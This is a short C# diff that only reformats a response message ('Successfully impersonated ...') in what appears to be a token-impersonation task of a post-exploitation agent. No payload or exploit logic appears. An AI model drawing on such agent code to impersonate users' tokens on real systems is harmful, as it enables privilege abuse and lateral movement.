@@ -96,9 +96,7 @@ namespace Tasks
                     {
                         _agent.GetIdentityManager().SetImpersonationIdentity(hImpersonationToken);
                         var cur = _agent.GetIdentityManager().GetCurrentImpersonationIdentity();
-                        resp = CreateTaskResponse(
-                            $"Successfully impersonated {cur.Name}",
-                            true);
+                        resp = CreateTaskResponse($"Successfully impersonated {cur.Name}", true);
                     }
                 }
             }
